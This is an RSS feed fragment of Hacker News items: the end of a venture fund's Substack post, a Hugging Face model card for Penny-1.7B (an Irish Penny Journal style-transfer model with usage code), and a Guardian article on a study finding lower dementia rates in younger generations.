src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8df4796-7c65-4487-b9f6-9c6ecc98352c_3024x4032.heic" width="242" height="322.6112637362637" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/c8df4796-7c65-4487-b9f6-9c6ecc98352c_3024x4032.heic&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1941,&quot;width&quot;:1456,&quot;resizeWidth&quot;:242,&quot;bytes&quot;:1985118,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/heic&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://verissimo.substack.com/i/163015421?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8df4796-7c65-4487-b9f6-9c6ecc98352c_3024x4032.heic&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8df4796-7c65-4487-b9f6-9c6ecc98352c_3024x4032.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8df4796-7c65-4487-b9f6-9c6ecc98352c_3024x4032.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8df4796-7c65-4487-b9f6-9c6ecc98352c_3024x4032.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8df4796-7c65-4487-b9f6-9c6ecc98352c_3024x4032.heic 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><em><a href="https://verissimo.vc/" rel="">Verissimo Ventures</a><span> is a Pre-seed and Seed Venture Fund based in Israel and the US. We invest primarily in enterprise software companies and take a fundamentals-driven approach to early-stage investing. We work closely with founders to help them build the strongest, most fundamentally sound businesses with potential for explosive growth and a meaningful impact on the market.</span></em></p><p><em>We were founded in 2020 and are currently investing out of our $26M Fund 2.</em></p></div></article></div><div id="discussion"><h4>Discussion about this post</h4></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Penny-1.7B Irish Penny Journal style transfer (144 pts)]]></title>
            <link>https://huggingface.co/dleemiller/Penny-1.7B</link>
            <guid>44160073</guid>
            <pubDate>Mon, 02 Jun 2025 15:49:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://huggingface.co/dleemiller/Penny-1.7B">https://huggingface.co/dleemiller/Penny-1.7B</a>, See on <a href="https://news.ycombinator.com/item?id=44160073">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
	<!-- HTML_TAG_START --><h2>
	<a rel="nofollow" href="#üì∞-penny17b-¬∑-irishpennyjournal-style-grpo" id="üì∞-penny17b-¬∑-irishpennyjournal-style-grpo">
		
	</a>
	<span>
		üì∞ Penny‚Äë1.7B ¬∑ Irish‚ÄØPenny‚ÄØJournal Style (GRPO)
	</span>
</h2>
<p>This is a <strong>style transfer</strong> from the Irish Penny Journal (1840) to Smollm2 using GRPO. For example, this response to "What is the capital of France"</p>
<pre><code>Verily, in the grand tapestry of European monarchies, the city of Paris, the seat of the mighty Emperor Napoleon, holds a place of singular distinction. This city, which hath borne the name of 'La Ville Lumi√®re' for nigh on two centuries, doth shine forth as a beacon of art, culture, and intellect, its very existence a testament to the ingenuity and brilliance of its people. And so, it is with great honour and reverence that we declare Paris, the majestic capital of the French realm, to be our noble question's answer.
</code></pre>
<p><strong>Penny‚Äë1.7B</strong> is a 1.7‚ÄØbillion‚Äëparameter causal language model fine‚Äëtuned with <strong>Group‚ÄØRelative‚ÄØPolicy‚ÄØOptimization (GRPO)</strong> to emulate the 19·µó ∞‚Äëcentury prose of the <em>Irish‚ÄØPenny‚ÄØJournal</em> (1840). The RL stage ran for <strong>6,800 policy steps</strong>, using a reward model trained to classify sentences as <em>original IPJ</em> vs <em>modern translation</em>. Maximizing this score nudges generations toward authentic Victorian‚Äëera diction while retaining the general reasoning ability of the base SmolLM2 model.</p>
<h2>
	<a rel="nofollow" href="#‚ú®-key-facts" id="‚ú®-key-facts">
		
	</a>
	<span>
		‚ú® Key Facts
	</span>
</h2>
<div>
	<table>
		<thead><tr>
<th></th>
<th></th>
</tr>

		</thead><tbody><tr>
<td><strong>Base model</strong></td>
<td><a rel="nofollow" href="https://huggingface.co/HuggingFaceTB/SmolLM2-1.7B-Instruct">SmolLM2‚Äë1.7B-Instruct</a></td>
</tr>
<tr>
<td><strong>Tuning method</strong></td>
<td>GRPO (RL)</td>
</tr>
<tr>
<td><strong>Policy steps</strong></td>
<td>6,800</td>
</tr>
<tr>
<td><strong>Reward model</strong></td>
<td>MiniLM2 L6 384H classifier</td>
</tr>
<tr>
<td><strong>Optimiser</strong></td>
<td>AdamW‚ÄØ8‚Äëbit ¬∑ lr‚ÄØ5‚ÄØ√ó‚ÄØ10^‚Åª6</td>
</tr>
<tr>
<td><strong>Hardware</strong></td>
<td>1√ó‚ÄØRTX‚ÄØA6000 (48‚ÄØGB) ¬∑ bf16</td>
</tr>
</tbody>
	</table>
</div>
<h2>
	<a rel="nofollow" href="#üî¨-training--data" id="üî¨-training--data">
		
	</a>
	<span>
		üî¨ Training &amp; Data
	</span>
</h2>
<ul>
<li><p><strong>Corpora</strong></p>
<ul>
<li><em>Irish‚ÄØPenny‚ÄØJournal</em> 1840 (dleemiller/irish_penny_journal)</li>
<li>Modernized translations produced via rule‚Äëbased spelling normalisation plus manual post‚Äëedit</li>
</ul>
</li>
<li><p><strong>Reward</strong> = classifier output</p>
</li>
</ul>
<h2>
	<a rel="nofollow" href="#‚û°Ô∏è-intended-uses" id="‚û°Ô∏è-intended-uses">
		
	</a>
	<span>
		‚û°Ô∏è Intended Uses
	</span>
</h2>
<ul>
<li>Creative writing, educational content, or stylistic pastiche in Victorian‚Äëera Irish English.</li>
<li>Research on RL‚Äëbased style transfer.</li>
</ul>
<p><strong>Not recommended for:</strong> contemporary fact Q&amp;A or contexts where archaic language could mislead readers.</p>
<h2>
	<a rel="nofollow" href="#‚ö†Ô∏è-limitations--biases" id="‚ö†Ô∏è-limitations--biases">
		
	</a>
	<span>
		‚ö†Ô∏è Limitations &amp; Biases
	</span>
</h2>
<p>19·µó ∞‚Äëcentury texts can contain outdated social views. Outputs may reflect such biases or archaic spelling. Always review generations before use.</p>
<h2>
	<a rel="nofollow" href="#üíª-quick-start" id="üíª-quick-start">
		
	</a>
	<span>
		üíª Quick Start
	</span>
</h2>
<pre><code><span>from</span> transformers <span>import</span> AutoModelForCausalLM, AutoTokenizer

checkpoint = <span>"dleemiller/Penny-1.7B"</span>

device = <span>"cuda"</span>  <span># or "cpu"</span>

tokenizer = AutoTokenizer.from_pretrained(checkpoint)
<span># For multi‚ÄëGPU: install accelerate and use device_map="auto"</span>
model = AutoModelForCausalLM.from_pretrained(checkpoint).to(device)

messages = [{<span>"role"</span>: <span>"user"</span>, <span>"content"</span>: <span>"What is the capital of France."</span>}]
input_text = tokenizer.apply_chat_template(messages, tokenize=<span>False</span>)
inputs = tokenizer.encode(input_text, return_tensors=<span>"pt"</span>).to(device)

outputs = model.generate(inputs,
                         max_new_tokens=<span>512</span>,
                         temperature=<span>0.8</span>,
                         top_p=<span>0.9</span>,
                         do_sample=<span>True</span>)

<span>print</span>(tokenizer.decode(outputs[<span>0</span>]))
</code></pre>
<h2>
	<a rel="nofollow" href="#üìù-citation" id="üìù-citation">
		
	</a>
	<span>
		üìù Citation
	</span>
</h2>
<pre><code>@software{penny_1.7b_2025,
  title        = {Penny‚Äë1.7B: Irish Penny Journal Style Language Model},
  author       = {Lee Miller},
  year         = 2025,
  publisher    = {Hugging Face},
  url          = {https://huggingface.co/dleemiller/Penny-1.7B}
}
</code></pre>
<h2>
	<a rel="nofollow" href="#üìú-license" id="üìú-license">
		
	</a>
	<span>
		üìú License
	</span>
</h2>
<p>Apache&nbsp;2.0 (inherits from the base model).</p>
<!-- HTML_TAG_END --></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Younger generations less likely to have dementia, study suggests (122 pts)]]></title>
            <link>https://www.theguardian.com/society/2025/jun/02/younger-generations-less-likely-dementia-study</link>
            <guid>44160012</guid>
            <pubDate>Mon, 02 Jun 2025 15:42:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theguardian.com/society/2025/jun/02/younger-generations-less-likely-dementia-study">https://www.theguardian.com/society/2025/jun/02/younger-generations-less-likely-dementia-study</a>, See on <a href="https://news.ycombinator.com/item?id=44160012">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="maincontent"><p>People born more recently are less likely to have dementia at any given age than earlier generations, research suggests, with the trend more pronounced in women.</p><p>According to the World Health Organization, in 2021 there were 57 million people worldwide living with dementia, with women disproportionately affected. However, while the risk of dementia increases with age, experts have long stressed it is not <a href="https://www.theguardian.com/society/article/2024/jul/31/almost-half-of-dementia-cases-could-be-prevented-or-delayed-study-finds" data-link-name="in body link">not an inevitability of getting older</a>.</p><p>‚ÄúYounger generations are less likely to develop dementia at the same age as their parents or grandparents, and that‚Äôs a hopeful sign,‚Äù said Dr Sabrina Lenzen, a co-author of the study from the University of Queensland‚Äôs Centre for the Business and Economics of <a href="https://www.theguardian.com/society/health" data-link-name="in body link" data-component="auto-linked-tag">Health</a>.</p><p>But she added: ‚ÄúThe overall burden of dementia will still grow as populations age, and significant inequalities remain ‚Äì especially by gender, education and geography.‚Äù</p><p>Writing in the journal <a href="https://jamanetwork.com/journals/jamanetworkopen/fullarticle/10.1001/jamanetworkopen.2025.13384?guestAccessKey=bacb167c-2948-4d8a-a4b4-4f6200aa35d6&amp;utm_source=for_the_media&amp;utm_medium=referral&amp;utm_campaign=ftm_links&amp;utm_content=tfl&amp;utm_term=060225" data-link-name="in body link">Jama Network Open</a>, researchers in Australia report how they analysed data from 62,437 people aged 70 and over, collected from three long-running surveys covering the US, England and parts of Europe.</p><p>The team used an algorithm that took into account participants‚Äô responses to a host of different metrics, from the difficulties they had with everyday activities to their scores on cognitive tests, to determine whether they were likely to have dementia.</p><p>They then split the participants into eight different cohorts, representing different generations. Participants were also split into six age groups.</p><p>As expected, the researchers found the prevalence of dementia increased by age among all birth cohorts, and in each of the three regions: UK, US and Europe. However, at a given age, people in more recent generations were less likely to have dementia compared with those in earlier generations.</p><p>‚ÄúFor example, in the US, among people aged 81 to 85, 25.1% of those born between 1890‚Äì1913 had dementia, compared to 15.5% of those born between 1939‚Äì1943,‚Äù said Lenzen, adding similar trends were seen in Europe and England, although less pronounced in the latter.</p><p>The team said the trend was more pronounced in women, especially in Europe and England, noting that one reason may be increased access to education for women in the mid-20th century.</p><p>However, taking into account changes in GDP, a metric that reflects broader economic shifts, did not substantially alter the findings.</p><p>Prof Tara Spires-Jones, the director of the Centre for Discovery Brain Sciences at the University of Edinburgh, described the study as well-conducted. ‚ÄúThe number of people living with dementia is still increasing due to our ageing population, but this study adds to the good news that more recent generations have a decreased risk compared to past generations,‚Äù she said.</p><p>While the study did not investigate the reasons for the decline, Spires-Jones noted a number of factors could be at play. ‚ÄúThis is likely due to interventions such as compulsory education, smoking bans, and improvements in medical treatments for conditions such as heart disease, diabetes, and hearing loss, which are associated with dementia risk,‚Äù she said.</p><p>Spires-Jones added the study had limitations, including that it did not rely on official diagnoses of dementia based on clinical testing.</p><p>Prof Tom Dening, of the University of Nottingham, said the study contained good news but it should not be assumed that the trend would continue, given some of the biggest health changes to reduce dementia risk may already have been made.</p><p>Prof Eric Brunner, of University College London, said it was important to look closely at recent trends and the impact of policies such as austerity, given other studies ‚Äì <a href="https://www.thelancet.com/journals/lanpub/article/PIIS2468-2667(23)00214-1/fulltext" data-link-name="in body link">including his own work</a> relating to England and Wales ‚Äì have suggested dementia incidence, in other words the rate of new cases, may no longer be declining.</p><p>David Thomas, the head of policy and public affairs at Alzheimer‚Äôs Research UK, said evidence suggested nearly half of dementia cases could be prevented or delayed by addressing 14 key risk factors ‚Äì from smoking to air quality ‚Äì although he noted not all were within individuals‚Äô control.</p><p>‚ÄúThat‚Äôs why Alzheimer‚Äôs Research UK is calling on the government to put in place a strategy for preventing ill-health, including addressing dementia risk,‚Äù he said.</p></div></div>]]></description>
        </item>
    </channel>
</rss>